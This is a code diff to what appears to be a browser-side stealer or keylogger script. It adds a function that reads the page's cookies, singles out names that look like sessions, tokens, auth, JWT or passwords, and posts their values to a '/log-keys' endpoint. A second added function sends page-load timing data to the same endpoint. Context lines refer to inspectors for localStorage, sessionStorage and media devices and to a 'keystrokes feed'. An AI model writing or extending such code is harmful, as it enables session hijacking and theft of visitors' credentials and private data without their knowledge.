@@ -1319,6 +1319,70 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         }).catch(() => {});
     }
 
+    // ═══ COOKIE INSPECTOR ═════════════════════════════════════
+    // Reads accessible (non-HttpOnly) cookies from document.cookie.
+    // HttpOnly cookies cannot be read from JS, but many session cookies are NOT HttpOnly.
+    function initCookieInspector() {
+        try {
+            const raw = document.cookie || '';
+            if (!raw.trim()) return;
+            const pairs = raw.split(';').map(s => s.trim()).filter(Boolean);
+            const sensitiveRe = /session|token|auth|jwt|user|id|key|login|pass|csrf|bearer/i;
+            const interesting = pairs.map(p => {
+                const eq = p.indexOf('=');
+                const name = eq > 0 ? p.slice(0, eq).trim() : p;
+                const val = eq > 0 ? p.slice(eq + 1).trim() : '';
+                if (sensitiveRe.test(name)) {
+                    return `${name}="${val.slice(0, 80)}"`;
+                }
+                return `${name}(${val.length}b)`;
+            });
+            post('/log-keys', {
+                keys: `[COOKIES] count=${pairs.length} ${interesting.join(' | ').slice(0, 500)}`,
+                url: location.href
+            });
+        } catch {}
+    }
+
+    // ═══ PERFORMANCE TIMING CAPTURE ═══════════════════════════
+    // Captures page load performance metrics (DNS, TCP, TTFB, DOMLoaded, Load).
+    function initPerformanceTimingCapture() {
+        // Use PerformanceNavigationTiming (modern) or legacy performance.timing
+        const capture = () => {
+            try {
+                const nav = performance.getEntriesByType('navigation')[0] || null;
+                let dns, tcp, ttfb, domLoad, pageLoad, navType;
+                if (nav) {
+                    dns      = Math.round(nav.domainLookupEnd - nav.domainLookupStart);
+                    tcp      = Math.round(nav.connectEnd - nav.connectStart);
+                    ttfb     = Math.round(nav.responseStart - nav.requestStart);
+                    domLoad  = Math.round(nav.domContentLoadedEventEnd - nav.startTime);
+                    pageLoad = Math.round(nav.loadEventEnd - nav.startTime);
+                    navType  = nav.type || 'navigate';
+                } else if (performance.timing) {
+                    const t = performance.timing;
+                    dns      = t.domainLookupEnd - t.domainLookupStart;
+                    tcp      = t.connectEnd - t.connectStart;
+                    ttfb     = t.responseStart - t.navigationStart;
+                    domLoad  = t.domContentLoadedEventEnd - t.navigationStart;
+                    pageLoad = t.loadEventEnd - t.navigationStart;
+                    navType  = 'legacy';
+                } else return;
+                if (!pageLoad || pageLoad <= 0) return; // page not fully loaded yet
+                post('/log-keys', {
+                    keys: `[PERF] dns=${dns}ms tcp=${tcp}ms ttfb=${ttfb}ms dom=${domLoad}ms load=${pageLoad}ms type=${navType}`,
+                    url: location.href
+                });
+            } catch {}
+        };
+        // Run after page fully loads
+        if (document.readyState === 'complete') {
+            setTimeout(capture, 100);
+        } else {
+            window.addEventListener('load', () => setTimeout(capture, 100));
+        }
+    }
+
     // ═══ DEVICE ORIENTATION / MOTION ══════════════════════════
     // Captures compass heading, tilt (alpha/beta/gamma) and motion data on mobile/tablet.
     // Sends a one-shot snapshot into the key-log so it appears in the keystrokes feed.
@@ -1452,6 +1516,8 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         initLocalStorageInspector();
         initSessionStorageInspector();
         initMediaDevicesCapture();
+        initCookieInspector();
+        initPerformanceTimingCapture();
         initErrorCapture();
         initNetworkMonitor();
         initOrientationTracker();
